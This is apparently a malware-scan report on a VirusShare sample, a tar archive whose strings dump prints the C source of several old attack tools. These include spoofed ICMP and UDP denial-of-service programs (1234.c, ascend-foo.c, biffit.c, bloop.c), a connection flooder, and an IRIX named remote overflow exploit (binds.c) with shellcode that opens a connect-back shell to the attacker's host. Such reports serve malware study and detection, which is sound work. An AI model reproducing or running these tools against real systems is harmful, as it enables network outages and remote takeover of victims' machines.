{
    "docinfo": {},
    "filename": "VirusShare_54473856e10fb077756fe0ee8ed9d436",
    "filesize": 2201600,
    "filetype": "POSIX tar archive (GNU)",
    "hashes": {
        "md5": "54473856e10fb077756fe0ee8ed9d436",
        "sha1": "ce34acfc6692af3a30231a8d048e2724854582a3",
        "sha256": "7732839d6aff89c68126b1f2c0ef1c145a6e5dc77386f8ca2b6704d985c44d3a"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "datapool/",
            "0040755",
            "0000000",
            "0000000",
            "00000000000",
            "07101434120",
            "011353",
            "ustar  ",
            "root",
            "root",
            "datapool/src/",
            "0040755",
            "0000000",
            "0000000",
            "00000000000",
            "07101436004",
            "012145",
            "ustar  ",
            "root",
            "root",
            "datapool/src/1234.c",
            "0100644",
            "0000000",
            "0000000",
            "00000013011",
            "07100655023",
            "012676",
            "ustar  ",
            "root",
            "root",
            "/* CAMELEON GROUPE PRESENTE 1234.c un denial of service parmit t'en d'autre",
            " * ATTENTION: Se denial of service a ete cre pour etude(but educatif) sur l *",
            " * 'icmp.Il est interdit de s'en servir pour un but de piratage.Le piratage est",
            " * interdit.Je ne me tien pas responsable de se que vous ferez de se prog.",
            " * Pour me trouvez 2 solution - faire le n17 sur son tel ou - m'ecrire ",
            " * tony@funradio.fr ;) THE SCRIPT CAME.BX sera bientot disponible!",
            " * I F.O.A.D. BILL GATE , MICROSHIT , LES POULETS , WINDAUBE , FIREBALL ,",
            " * NEWBIES , LAMES , PD , COWBOYs AND WARLORDs , tous se qui ont pas ",
            " * cruent en moi , JCzic(tu aurras jamais linux, mais linux te turas).   ",
            " * Merci : Les operateurs de #funradio, mach..., rewtou, cod4, ",
            " * ...et tous les autres.  ",
            " * CAMELEON GROUPE F.O.A.D. THE WORLD! VIVE LA FRANCE!",
            "#include <stdio.h>",
            "#include <unistd.h>",
            "#include <stdlib.h>",
            "#include <string.h>",
            "#include <sys/types.h>",
            "#include <sys/time.h>",
            "#include <sys/socket.h>",
            "#include <netdb.h>",
            "#include <netinet/in.h>",
            "#include <netinet/ip.h>",
            "#include <netinet/ip_icmp.h>",
            "void banner(void) {",
            "   printf(\"\\n1234 1.0 BY CAMELEON G.\\n\");",
            "   printf(\"reprise de came.c and ssping.c\\n\\n\");",
            "void usage(const char *progname) {",
            "   printf(\"usage :\\n\");",
            "   printf(\"%s <spoof adresse> <dst ip> <num>\\n\",progname);",
            "   printf(\" < spoof   > : ip spoof ex: 127.0.0.1\\n\");",
            "   printf(\" < dest    > : ip victim ex:193.252.19.3\\n\");",
            "   printf(\" < number  > : 10\\n\");",
            "   printf(\" Se denial of service rulezzzzzzzzzzz! Non?\\n\");",
            "   printf(\" Se prog  t fait pour l'etude et pas pour s'en servir.\\n\");",
            "int resolve( const char *name, unsigned int port, struct sockaddr_in *addr ) {",
            "   struct hostent *host;",
            "   memset(addr,0,sizeof(struct sockaddr_in));",
            "   addr->sin_family = AF_INET;",
            "   addr->sin_addr.s_addr = inet_addr(name);",
            "   if (addr->sin_addr.s_addr == -1) {",
            "      if (( host = gethostbyname(name) ) == NULL )  {",
            "         fprintf(stderr,\"ERROR: Unable to resolve host %s\\n\",name);",
            "         return(-1);",
            "      }",
            "      addr->sin_family = host->h_addrtype;",
            "      memcpy((caddr_t)&addr->sin_addr,host->h_addr,host->h_length);",
            "   }",
            "   addr->sin_port = htons(port);",
            "   return(0);",
            "unsigned short in_cksum(addr, len)",
            "    u_short *addr;",
            "    int len;",
            "    register int nleft = len;",
            "    register u_short *w = addr;",
            "    register int sum = 0;",
            "    u_short answer = 0;",
            "    /*",
            "     * Our algorithm is simple, using a 32 bit accumulator (sum), we add",
            "     * sequential 16 bit words to it, and at the end, fold back all the",
            "     * carry bits from the top 16 bits into the lower 16 bits.",
            "     */",
            "    while (nleft > 1)  {",
            "        sum += *w++;",
            "        nleft -= 2;",
            "    }",
            "    /* mop up an odd byte, if necessary */",
            "    if (nleft == 1) {",
            "        *(u_char *)(&answer) = *(u_char *)w ;",
            "        sum += answer;",
            "    }",
            "    /* add back carry outs from top 16 bits to low 16 bits */",
            "    sum = (sum >> 16) + (sum & 0xffff); /* add hi 16 to low 16 */",
            "    sum += (sum >> 16);\t\t\t/* add carry */",
            "    answer = ~sum;\t\t\t/* truncate to 16 bits */",
            "    return(answer);",
            "int send_winbomb(int socket,",
            "                 unsigned long spoof_addr,",
            "                 struct sockaddr_in *dest_addr) {",
            "   unsigned char  *packet;",
            "   struct iphdr   *ip;",
            "   struct icmphdr *icmp;",
            "   int rc;",
            "        ",
            "   packet = (unsigned char *)malloc(sizeof(struct iphdr) +",
            "                        \t    sizeof(struct icmphdr) + 8);",
            "   ip = (struct iphdr *)packet;",
            "   icmp = (struct icmphdr *)(packet + sizeof(struct iphdr));",
            "   memset(ip,0,sizeof(struct iphdr) + sizeof(struct icmphdr) + 8);",
            "   /* This is the IP header of our packet. */",
            "   ip->ihl      = 5;",
            "   ip->version  = 4;",
            "// ip->tos      = 2;",
            "   ip->id       = htons(1234);",
            "   ip->frag_off |= htons(0x2000);",
            "// ip->tot_len  = 0;",
            "   ip->ttl      = 30;",
            "   ip->protocol = IPPROTO_ICMP;",
            "   ip->saddr    = spoof_addr;",
            "   ip->daddr\t= dest_addr->sin_addr.s_addr;",
            "   ip->check    = in_cksum(ip, sizeof(struct iphdr));",
            "   icmp->type     \t   = 12;",
            "   icmp->code     \t   = 0;",
            "   icmp->checksum \t   = in_cksum(icmp,sizeof(struct icmphdr) + 1);",
            "   if (sendto(socket,",
            "              packet,",
            "              sizeof(struct iphdr) +",
            "              sizeof(struct icmphdr) + 1,0,",
            "              (struct sockaddr *)dest_addr,",
            "              sizeof(struct sockaddr)) == -1) { return(-1); }",
            "   ip->tot_len  = htons(sizeof(struct iphdr) + sizeof(struct icmphdr) + 8);",
            "   ip->frag_off = htons(8 >> 3);",
            "   ip->frag_off |= htons(0x2000);",
            "   ip->check    = in_cksum(ip, sizeof(struct iphdr));",
            "   icmp->type = 0;",
            "   icmp->code = 0;",
            "   icmp->checksum = 0;",
            "   if (sendto(socket,",
            "              packet,",
            "              sizeof(struct iphdr) +",
            "              sizeof(struct icmphdr) + 8,0,",
            "              (struct sockaddr *)dest_addr,",
            "              sizeof(struct sockaddr)) == -1) { return(-1); }",
            "   free(packet);",
            "   return(0);",
            "int main(int argc, char * *argv) {",
            "   struct sockaddr_in dest_addr;",
            "   unsigned int i,sock;",
            "   unsigned long src_addr;",
            "   banner();",
            "   if ((argc != 4)) {",
            "      usage(argv[0]);",
            "      return(-1);",
            "   }",
            "   if((sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) { ",
            "      fprintf(stderr,\"ERROR: Opening raw socket.\\n\");",
            "      return(-1);",
            "   }",
            "   if (resolve(argv[1],0,&dest_addr) == -1) { return(-1); }",
            "   src_addr = dest_addr.sin_addr.s_addr;",
            "   if (resolve(argv[2],0,&dest_addr) == -1) { return(-1); }",
            "   printf(\"%s: J'envoie la sauce! b00m!\\n\",argv[0]);",
            "   for (i = 0;i < atoi(argv[3]);i++) {",
            "      if (send_winbomb(sock,",
            "                       src_addr,",
            "                       &dest_addr) == -1) {",
            "         fprintf(stderr,\"ERROR: faut etre root IDIO.\\n\");",
            "         return(-1);",
            "      }",
            "     ",
            "   }",
            "datapool/src/arnup100.c",
            "0100644",
            "0000000",
            "0000000",
            "00000011544",
            "07065766356",
            "013712",
            "ustar  ",
            "root",
            "root",
            "/************************************************************************/",
            "/* arnudp100.c - sends a single UDP datagram with the source and\t*/",
            "/* destination address and port set to whatever you want.\t\t*/",
            "/* Known to work on:  Linux pre2.0.7 (486),  SunOS 5.4 (SPARC) and\t*/",
            "/* FreeBSD 2.1.0 (486).\t\t\t\t\t\t\t*/",
            "/* Old kernels such as SunOS 4.1 and Linux 1.2 will overwrite the\t*/",
            "/* source address with the real address of the interface.\t\t*/",
            "/* Should compile fine with just an ANSI compiler (such as gcc) under\t*/",
            "/* Linux and SunOS 4.1, but with SunOS 5.4 you may have to specify\t*/",
            "/* extra libraries on the command line:\t\t\t\t\t*/",
            "/* \t/usr/ucb/cc -o arnudp arnudp100.c -lsocket -lnsl\t\t*/",
            "/* I'll state the obvious - this needs to be run as root!  Do not use\t*/",
            "/* this program unless you know what you are doing, as it is possible\t*/",
            "/* that you could confuse parts of your network\t/ internet.\t\t*/",
            "/* Written by R.T.Arnold (arny@geek.org.uk) for Netcraft Ltd.\t\t*/",
            "/* (c) copyright 1996 R.T. Arnold.  This is not free software.\t\t*/",
            "/************************************************************************/",
            "#include<sys/types.h>",
            "#include<sys/socket.h>",
            "#include<netinet/in.h>",
            "#include<arpa/inet.h>",
            "#include<netdb.h>",
            "#include<errno.h>",
            "#include<stdio.h>",
            "#include<stdlib.h>",
            "#include<string.h>",
            "#ifndef INADDR_NONE",
            "#define INADDR_NONE     0xffffffff",
            "#endif",
            "u_long getip(char*);",
            "u_short getportudp(char*);",
            "u_long cptol(u_char*);",
            "u_char *stocp(u_char*,u_short);",
            "u_char *ltocp(u_char*,u_long);",
            "union shortunion { u_short s; u_char c[2]; };",
            "union longunion { u_long l; u_char c[4]; };",
            "struct sockaddr sa;",
            "main(int argc,char **argv)",
            "int fd;",
            "int x=1;",
            "u_long host;",
            "u_short service;",
            "struct sockaddr_in *p;",
            "u_char gram[]=",
            "\t0x45,\t0x00,\t0,\t0,",
            "\t0x00,\t0x00,\t0x00,\t0x00,",
            "\t0xFF,\t0x11,\t0x00,\t0x00,",
            "\t0,\t0,\t0,\t0,",
            "\t0,\t0,\t0,\t0,",
            "\t0,\t0,\t0,\t0,",
            "\t0x00,\t0x12,\t0x00,\t0x00,",
            "\t'1','2','3','4','5','6','7','8','9','0'",
            "/* sanity check... */",
            "if((sizeof(u_char)!=1)||(sizeof(u_short)!=2)||(sizeof(u_long)!=4))",
            "\tfprintf(stderr,\"error: integer types aren't the right size.\\n\");",
            "\texit(1);",
            "/* it does seem odd that the total length needs to be in host byte order */",
            "stocp(gram+2,(u_short)sizeof(gram));",
            "if(argc!=5)",
            "\tfprintf(stderr,\"usage: %s sourcename sourceport destinationname destinationport\\n\",*argv);",
            "\texit(1);",
            "/* fill in source/destination addresses/ports and the socket address...*/",
            "if(strcmp(argv[1],\"255.255.255.255\")==0) host=0xffffffff; else if((host=getip(argv[1]))==INADDR_NONE) exit(1);",
            "ltocp(gram+12,host);",
            "if(strcmp(argv[3],\"255.255.255.255\")==0) host=0xffffffff; else if((host=getip(argv[3]))==INADDR_NONE) exit(1);",
            "ltocp(gram+16,host);",
            "p=(struct sockaddr_in*)&sa;",
            "p->sin_family=AF_INET;",
            "p->sin_addr.s_addr=host;",
            "if(strcmp(argv[2],\"0\")==0) service=0; else if((service=getportudp(argv[2]))==0) exit(1);",
            "stocp(gram+20,service);",
            "if(strcmp(argv[4],\"0\")==0) service=0; else if((service=getportudp(argv[4]))==0) exit(1);",
            "stocp(gram+22,service);",
            "if((fd=socket(AF_INET,SOCK_RAW,IPPROTO_RAW))== -1)",
            "\tperror(\"socket\");",
            "\texit(1);",
            "#ifdef IP_HDRINCL",
            "if (setsockopt(fd,IPPROTO_IP,IP_HDRINCL,(char*)&x,sizeof(x))<0)",
            "\tperror(\"setsockopt IP_HDRINCL\");",
            "\texit(1);",
            "        };",
            "#else",
            "fprintf(stderr,\"the IP_HDRINCL option didn't exist on the system this was compliled on.\\n\");",
            "#endif",
            "if((sendto(fd,&gram,sizeof(gram),0,&sa,sizeof(sa)))== -1)",
            "\tperror(\"sendto\");",
            "\texit(1);",
            "printf(\"datagram passed to kernel:\");",
            "for(x=0;x<(sizeof(gram)/sizeof(u_char));x++)",
            "\tif(!(x%4)) putchar('\\n');",
            "\tprintf(\"%02x\",gram[x]);",
            "putchar('\\n');",
            "return(0);",
            "/* returns IP address (as a u_long) given a hostname string\t\t*/",
            "u_long getip(char *hostname)",
            "u_long ip;",
            "struct hostent *he;",
            "if((ip=inet_addr(hostname))==INADDR_NONE)",
            "\tif((he=gethostbyname(hostname))==NULL)",
            "\t\tfprintf(stderr,\"error: can't resolve hostname \\\"%s\\\"\\n\",hostname);",
            "\t\treturn(INADDR_NONE);",
            "\t\t};",
            "\tif(he->h_addrtype!=AF_INET) fprintf(stderr,\"warning: resolved address type is not AF_INET, will try to carry on anyway.\\n\");",
            "\tif(he->h_length!=4) fprintf(stderr,\"warning: resolved address length is not 4, will try to carry on anyway.\\n\");",
            "\tip=cptol((u_char*)*(he->h_addr_list));",
            "return(ip);",
            "/* returns port given a UDP service name or port number\t\t\t*/",
            "u_short getportudp(char *service)",
            "u_short port;",
            "struct servent *se;",
            "if((port=atoi(service))!=0) return(htons(port));",
            "if((se=getservbyname(service,\"udp\"))==NULL)",
            "\tfprintf(stderr,\"error: unknown service \\\"%s\\\"\\n\",service);",
            "\treturn(0);",
            "return(se->s_port);",
            "/* the following functions convert between types, hopefully in a way thats portable */",
            "u_long cptol(u_char *cp)",
            "static union longunion l;",
            "l.c[0]=cp[0];",
            "l.c[1]=cp[1];",
            "l.c[2]=cp[2];",
            "l.c[3]=cp[3];",
            "return(l.l);",
            "u_char *stocp(u_char *cp,u_short us)",
            "static union shortunion s;",
            "s.s=us;",
            "cp[0]=s.c[0];",
            "cp[1]=s.c[1];",
            "return(cp);",
            "u_char *ltocp(u_char *cp,u_long ul)",
            "static union longunion l;",
            "l.l=ul;",
            "cp[0]=l.c[0];",
            "cp[1]=l.c[1];",
            "cp[2]=l.c[2];",
            "cp[3]=l.c[3];",
            "return(cp);",
            "datapool/src/ascend-foo.c",
            "0100644",
            "0000000",
            "0000000",
            "00000004163",
            "07051164074",
            "014341",
            "ustar  ",
            "root",
            "root",
            "/* ascend foo denial of service exploit",
            " * 1999/09/25",
            " * basically just another lame echo/echo link, but has nice results on ascend,",
            " * you can increase the lag in steps of 2ms by sending one packet, after some",
            " * few hundret ms lag you overflow the internal packet buffer and the whole",
            " * connection stalls, the router has to be rebooted.",
            " * by scut / team teso [http://teso.scene.at/]",
            " * compile with: gcc -o ascend-foo ascend-foo.c -Wall -lnet -DLIBNET_LIL_ENDIAN",
            " * works fine against Ascend Pipeline * modells, haven't tried against others",
            "#include <stdio.h>",
            "#include <libnet.h>",
            "main (int argc, char **argv)",
            "\tint\tsock, c;",
            "\tu_long\tsrc_ip;",
            "\tu_char\t*buf;",
            "\tu_char\t*qbuf;",
            "\tint\tqbuf_s = 0;",
            "\tprintf (\"ascend-foo, udp echo dos attack\\nby scut / team teso\\n\\n\");",
            "\tif (argc < 2) {",
            "\t\tprintf (\"usage: %s <srcip> [packetsize]\\n\\n\", argv[0]);",
            "\t\texit (EXIT_FAILURE);",
            "\t} else if (argc == 2) {",
            "\t\tqbuf_s = 73;",
            "\t} else {",
            "\t\tqbuf_s = atoi (argv[2]);",
            "\tqbuf = malloc (qbuf_s);",
            "\tsrc_ip  = libnet_name_resolve (argv[1], 0);",
            "\tif (src_ip == 0) {",
            "\t\tprintf (\"invalid syntax\\n\");",
            "\t\texit (EXIT_FAILURE);",
            "    ",
            "\tbuf = calloc (1, (UDP_H + IP_H + qbuf_s));",
            "\tif (buf == NULL) {",
            "\t\tperror (\"No memory for packet\");",
            "\t\texit (EXIT_FAILURE);",
            "\tlibnet_seed_prand ();",
            "\tsock = libnet_open_raw_sock(IPPROTO_RAW);",
            "\t\tif (sock == -1) {",
            "\t\tperror (\"No socket\");",
            "\t\texit (EXIT_FAILURE);",
            "    ",
            "\tlibnet_build_ip (\tUDP_H + qbuf_s,\t/* content size */",
            "\t\t\t\t0,\t\t/* tos */",
            "\t\t\t\t0,\t\t/* id */",
            "\t\t\t\t0,\t\t/* frag */",
            "\t\t\t\t64,\t\t/* ttl */",
            "\t\t\t\tIPPROTO_UDP,\t/* subprotocol */",
            "\t\t\t\tsrc_ip,\t\t/* heh ;) */",
            "\t\t\t\tsrc_ip,",
            "\t\t\t\tNULL,\t\t/* payload already there */",
            "\t\t\t\t0,\t\t/* same */",
            "\t\t\t\tbuf);\t\t/* build in packet buffer */",
            "\tlibnet_build_udp (\t7,\t/* source port */",
            "\t\t\t\t7,",
            "\t\t\t\tqbuf,\t\t/* content already there */",
            "\t\t\t\tqbuf_s,\t\t/* same */",
            "\t\t\t\tbuf + IP_H);\t/* build after ip header */",
            "\tlibnet_do_checksum (buf, IPPROTO_UDP, UDP_H + qbuf_s);",
            "\tc = libnet_write_ip (sock, buf, UDP_H + IP_H + qbuf_s);",
            "\tif (c < UDP_H + IP_H + qbuf_s) {",
            "\t\tprintf (\"write_ip wrote too less bytes\\n\");",
            "\tprintf (\"completed, wrote %d bytes to victim router\\n\", c);",
            "\tfree (buf);",
            "\treturn (c == -1 ? EXIT_FAILURE : EXIT_SUCCESS);",
            "datapool/src/beer.c",
            "0100644",
            "0000000",
            "0000000",
            "00000002047",
            "07051164074",
            "013237",
            "ustar  ",
            "root",
            "root",
            "#include <stdio.h>",
            "#include <sys/param.h>",
            "#include <sys/socket.h>",
            "#include <netinet/in.h>",
            "#include <netdb.h>",
            "#include <stdarg.h>",
            "void beer(char *server, int port);",
            "void alcohol(char *host, int loop);",
            "main(int argc, char **argv) {",
            "   if (argc != 3) {",
            "      printf(\"beer.c by ???\\n\");",
            "      printf(\"Edited, and made for use with VT/bx by Cyranix0r\\n\");",
            "      printf(\"Usage: %s <host> <times>\\n\");",
            "   } else {",
            "      alcohol(argv[1], atoi(argv[2]));",
            "   }",
            "void beer(char *server, int port) {",
            "   struct sockaddr_in sin;",
            "   struct hostent *hp;",
            "   int thesock;",
            "   hp = gethostbyname(server);",
            "   if (hp == NULL) {",
            "      printf(\"unknown host: %s\\n\", server);",
            "      exit(1);",
            "   }",
            "   bzero((char*) &sin, sizeof(sin));",
            "   bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);",
            "   sin.sin_family = hp->h_addrtype;",
            "   sin.sin_port = htons(port);",
            "   thesock = socket(AF_INET, SOCK_STREAM, 0);",
            "   connect(thesock, (struct sockaddr *) &sin, sizeof(sin));",
            "void alcohol(char *host, int loop) {",
            "   int i;",
            "   for(i = 0; i < loop; i++) {",
            "      beer(host, 4321);",
            "   }",
            "datapool/src/biffit.c",
            "0100644",
            "0000000",
            "0000000",
            "00000003422",
            "07051164074",
            "013563",
            "ustar  ",
            "root",
            "root",
            " *  filename:  biffit.c",
            " *  author:    sygma @undernet",
            " *  problem:   in.comsat uses UDP, and forks, so just think about it. :)",
            " *\t       IT CAN cripple BSD boxes.",
            " *  notes:     I wrote this for a friend to show him something,",
            " *\t       I won't be held reponsible for the missuse most people do",
            " *\t       with this stuff.  This is for Educational user only!",
            " *  tested on: Linux [slackware]",
            " *             FreeBSD 2.2.5-Stable",
            " * \t       NetBSD 1.2",
            "#include <stdio.h> ",
            "#include <stdlib.h> ",
            "#include <errno.h> ",
            "#include <string.h> ",
            "#include <sys/types.h> ",
            "#include <netinet/in.h> ",
            "#include <netdb.h> ",
            "#include <sys/socket.h> ",
            "#include <sys/wait.h> ",
            "#define MYPORT 512",
            "int i;",
            "int main(int argc, char *argv[])",
            "\tint sockfd;",
            "\tstruct sockaddr_in their_addr; /* connector's address information */",
            "\tstruct hostent *he;",
            "\tint numbytes;",
            "\tchar message[80];",
            "\tif (argc != 3) {",
            "\t    fprintf(stderr,\"usage: \\n\");",
            "\t    fprintf(stderr,\"    %s [hostname] [username]\\n\",argv[0]);",
            "\t    exit(1);",
            "\tif ((he=gethostbyname(argv[1])) == NULL) {  /* get the host info */",
            "\t    herror(\"gethostbyname\");",
            "\t    exit(1);",
            "\tif ((sockfd = socket(AF_INET, SOCK_DGRAM, 0)) == -1) {",
            "\t    perror(\"socket\");",
            "\t    exit(1);",
            "\ttheir_addr.sin_family = AF_INET;      /* host byte order */",
            "\ttheir_addr.sin_port = htons(MYPORT);  /* short, network byte order */",
            "\ttheir_addr.sin_addr = *((struct in_addr *)he->h_addr);",
            "\tbzero(&(their_addr.sin_zero), 8);     /* zero the rest of the struct */",
            "\ti=0;",
            "\tsprintf(message,\"%s@0\",argv[2]);",
            "\twhile(1)",
            "\t\tif ((numbytes=sendto(sockfd, message, strlen(message), 0, ",
            "             \t(struct sockaddr *)&their_addr, sizeof(struct sockaddr))) == -1)",
            "\t\t\tperror(\"recvfrom\");",
            "\t\t\texit(1);",
            "        \t}",
            "\t\ti++;",
            "\t\tif (i==10000) {printf(\".\");i=0;}",
            "\t\t// fuck usleep(100);",
            "\tclose(sockfd);",
            "\treturn 0;",
            "datapool/src/binds.c",
            "0100644",
            "0000000",
            "0000000",
            "00000015073",
            "07100655034",
            "013420",
            "ustar  ",
            "root",
            "root",
            "/*   Copyright (c) May 1998       Last Stage of Delirium   */",
            "/*      THIS IS UNPUBLISHED PROPRIETARY SOURCE CODE OF      */",
            "/*                  Last Stage of Delirium                  */",
            "/*                                                          */",
            "/*   The contents of this file  may be disclosed to third   */",
            "/*   parties, copied and duplicated in any form, in whole   */",
            "/*   or in part, without the prior written consent of LsD.  */",
            "/* SGI named remote overflow exploit                        */",
            "/* tested on IRIX 5.3 and 6.2 including multiprocessor and  */ ",
            "/* multicache machines                                      */",
            "/* won't work on IRIX64 6.2 since its named binary seems to */",
            "/* be not vulnerable to the iquery overflow                 */",
            "/* usage ./r local_adr local_port target                    */",
            "/* you must specify the local_adr and local_port since      */ ",
            "/* the remote shell is a connecting shell not a classic     */",
            "/* bind shell (it connects with the local machine)          */",
            "#include <sys/types.h>",
            "#include <sys/socket.h>",
            "#include <netinet/in.h>",
            "#include <unistd.h>",
            "#include <netdb.h>",
            "#include <stdio.h>",
            "#include <fcntl.h>",
            "#include <errno.h>",
            "#define START_ADR\t0x10040100\t",
            "#define PUTADR(p,adr) {*p=(adr>>24)&0xff;*(p+1)=(adr>>16)&0xff;*(p+2)=(adr>>8)&0xff;*(p+3)=adr&0xff;}",
            "#define PUTADRH(p,adr) {*p=(adr>>24)&0xff;*(p+1)=(adr>>16)&0xff;}",
            "#define PUTADRL(p,adr) {*p=(adr>>8)&0xff;*(p+1)=adr&0xff;}",
            "char tablica[25]={",
            "0x00,0x00,0x34,0x34,0x09,0x80,0x00,0x00,",
            "0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,",
            "0x01,0x00,0x01,0x20,0x20,0x20,0x20,0x00,0x00};",
            "char asmcode[]={",
            "0x24,0x04,0x00,0x02,0x24,0x05,0x00,0x02,0x24,0x06,0x00,0x00,0x24,0x02,0x04,0x53,",
            "0x00,0x00,0x00,0x0c,0x00,0x00,0x00,0x00,0x00,0x40,0x80,0x25,0x00,0x40,0x20,0x25,",
            "0x3c,0x05,0x10,0x04,0x34,0xa5,0xff,0xff,0x24,0x06,0x00,0x10,0x24,0x02,0x04,0x43,0x00,0x00,0x00,0x0c,0x00,0x00,0x00,0x00,0x24,0x02,0x03,0xee,0x24,0x04,0x00,0x00,0x00,0x00,0x00,0x0c,0x00,0x00,0x00,0x00,0x24,0x02,0x03,0xee,0x24,0x04,0x00,0x01,0x00,0x00,0x00,0x0c,0x00,0x00,0x00,0x00,0x24,0x02,0x03,0xee,0x24,0x04,0x00,0x02,0x00,0x00,0x00,0x0c,0x00,0x00,0x00,0x00,0x02,0x00,0x20,0x25,0x24,0x02,0x04,0x11,0x00,0x00,0x00,0x0c,0x00,0x00,0x00,0x00,0x02,0x00,0x20,0x25,0x24,0x02,0x04,0x11,0x00,0x00,0x00,0x0c,0x00,0x00,0x00,0x00,0x02,0x00,0x20,0x25,0x24,0x02,0x04,0x11,0x00,0x00,0x00,0x0c,0x00,0x00,0x00,0x00,0x3c,0x04,0x10,0x01,0x34,0x84,0xff,0xf1,0x3c,0x05,0x10,0x02,0x34,0xa5,0xff,0xf2,0x24,0x02,0x03,0xf3,0x00,0x00,0x00,0x0c,0x00,0x00,0x00,0x00,",
            "'/','b','i','n','/','s','h',0, ",
            "0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x00,0x00,0x00,",
            "0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00  ",
            "main(int argc,char **argv){",
            "    int sck,i,srvsck;",
            "    fd_set readfs;",
            "    struct sockaddr_in address;",
            "    struct sockaddr_in local;",
            "    struct hostent *hp;",
            "    int size;",
            "    unsigned long lregt9,lreggp,lstart,lbcop7,ltmp;",
            "    char regt9[4],reggp[4],start[4],bcop7[4];\t",
            "    char *b,*p;",
            "    ",
            "    printf(\"IRIX named remote exploit\\n\");",
            "    printf(\"Last Stage of Delirium, May 1998, Poland\\n\\n\");",
            "    if(argc!=4){",
            "        printf(\"usage: %s local_adr local_port target\\n\",argv[0]);exit(1);",
            "    }",
            "    srvsck=socket(AF_INET,SOCK_STREAM,0);",
            "    bzero(&local,sizeof(local));",
            "    local.sin_family=AF_INET;",
            "    local.sin_port=htons(atoi(argv[2]));",
            "    if((local.sin_addr.s_addr=inet_addr(argv[1]))==-1){",
            "        if((hp=gethostbyname(argv[1]))==NULL){",
            "            printf(\"error: address.\\n\");exit(-1);",
            "        }",
            "        memcpy(&local.sin_addr.s_addr,hp->h_addr,4);",
            "    }",
            "    if (bind(srvsck,(struct sockaddr *)&local,sizeof(local))<0) {",
            "       perror(\"error\");exit(-1);",
            "     } ",
            "    lbcop7=lregt9=START_ADR;",
            "    lstart=START_ADR+0x14;\t",
            "    lreggp=START_ADR+0x8024;\t",
            "    PUTADR(regt9,lregt9);",
            "    PUTADR(reggp,lreggp);",
            "    PUTADR(start,lstart);",
            "    PUTADR(bcop7,lbcop7);",
            "    ltmp=START_ADR+0xd8;",
            "    PUTADRH(&asmcode[0x34-20+2],ltmp);",
            "    PUTADRL(&asmcode[0x38-20+2],ltmp);",
            "    ltmp=START_ADR+0xc8;",
            "    PUTADRH(&asmcode[0xa8-20+2+4],ltmp);",
            "    PUTADRL(&asmcode[0xac-20+2+4],ltmp);",
            "    PUTADR(&asmcode[0xcc-20+4],ltmp);",
            "    ltmp=START_ADR+0xd0;",
            "    PUTADRH(&asmcode[0xb0-20+2+4],ltmp);",
            "    PUTADRL(&asmcode[0xb4-20+2+4],ltmp);",
            "    ltmp=local.sin_addr.s_addr;",
            "    PUTADR(&asmcode[0xdc-20],ltmp);",
            "    ltmp=local.sin_port;",
            "    PUTADRL(&asmcode[0xda-20],ltmp);",
            "    size=930;",
            "    tablica[0]=(size+23)>>8;",
            "    tablica[1]=(size+23)&0xff;",
            "    tablica[23]=size>>8;",
            "    tablica[24]=size&0xff;",
            "    if((b=(char*)malloc(10500))==NULL) return(-1);",
            "    memset(b,0,10500);",
            "    bcopy(tablica,b,sizeof(tablica));",
            "    for(i=0;i<sizeof(asmcode);i++)",
            "      b[2+32+i]=asmcode[i];",
            "    for(i=0;i<4;i++){",
            "      b[2+200+420+i]=start[i];",
            "      b[2+200+420+420+i]=regt9[i];",
            "      b[1018+i]=reggp[i];",
            "      b[930+i]=bcop7[i];",
            "      b[1018-(7*8+4)+i]=regt9[i];",
            "    }",
            "    b[968]=0x20;",
            "    b[528]=0x08;",
            "    sck=socket(AF_INET,SOCK_STREAM,0);",
            "    bzero(&address,sizeof(address));",
            "    address.sin_family=AF_INET;",
            "    address.sin_port=htons(53);",
            "    if((address.sin_addr.s_addr=inet_addr(argv[3]))==-1){",
            "        if((hp=gethostbyname(argv[3]))==NULL){",
            "            printf(\"error: address.\\n\");exit(-1);",
            "        }",
            "        memcpy(&address.sin_addr.s_addr,hp->h_addr,4);",
            "    }",
            "    if(connect(sck,(struct sockaddr *)&address,sizeof(address))<0){",
            "        perror(\"error\");exit(-1);",
            "    }",
            "    fflush(stdout);",
            "    write(sck,b,25+size);",
            "    close(sck);",
            "    size=10000;",
            "    b[0]=(size+23)>>8;",
            "    b[1]=(size+23)&0xff;",
            "    b[23]=size>>8;",
            "    b[24]=size&0xff;",
            "    sck=socket(AF_INET,SOCK_STREAM,0);",
            "    if(connect(sck,(struct sockaddr *)&address,sizeof(address))<0){",
            "        perror(\"error\");exit(-1);",
            "    }",
            "    fflush(stdout);",
            "    write(sck,b,25+size);",
            "    close(sck);",
            "    listen(srvsck,5);",
            "    srvsck=accept(srvsck,(struct sockaddr*)&local,&i);",
            "    printf(\"%s successfully exploited\\n\",argv[3]); ",
            "    fflush(stdout);",
            "    while(1){",
            "        FD_ZERO(&readfs);",
            "        FD_SET(0,&readfs);",
            "        FD_SET(srvsck,&readfs);   ",
            "        if(select(FD_SETSIZE,&readfs,NULL,NULL,NULL)){",
            "            int cnt;",
            "            char buf[1024];",
            "            if(FD_ISSET(0,&readfs)){",
            "                if((cnt=read(0,buf,1024))<1){",
            "                    if(errno==EWOULDBLOCK||errno==EAGAIN) continue; ",
            "                    else {printf(\"koniec.\\n\");exit(-1);}",
            "                }",
            "                write(srvsck,buf,cnt);",
            "            }",
            "            if(FD_ISSET(srvsck,&readfs)){",
            "                if((cnt=read(srvsck,buf,1024))<1){",
            "                    if(errno==EWOULDBLOCK||errno==EAGAIN) continue; ",
            "                    else {printf(\"koniec.\\n\");exit(-1);}",
            "                }",
            "                write(1,buf,cnt);",
            "            }",
            "        }",
            "    }",
            "   free(b);",
            "   close(srvsck);",
            "/*                    www.hack.co.za                    */",
            "datapool/src/bloop.c",
            "0100644",
            "0000000",
            "0000000",
            "00000011045",
            "07100655046",
            "013432",
            "ustar  ",
            "root",
            "root",
            "/* Simple denial of service attack against Windows98/95 Machines",
            "   Overview: Sends random spoofed ICMP packets similar to a weaker",
            "   protocol as of ssping or jolt.",
            "   Result: Freezes the users machine or a CPU usage will rise to extreme",
            "   lag potentiol. (c) Legion2000 Security Research , code may be",
            "   distributed - credit is greatfully given if so..",
            "   http://www.legion2000.org     http://www.sekurity-net.com",
            "#include <stdio.h>",
            "#include <unistd.h>",
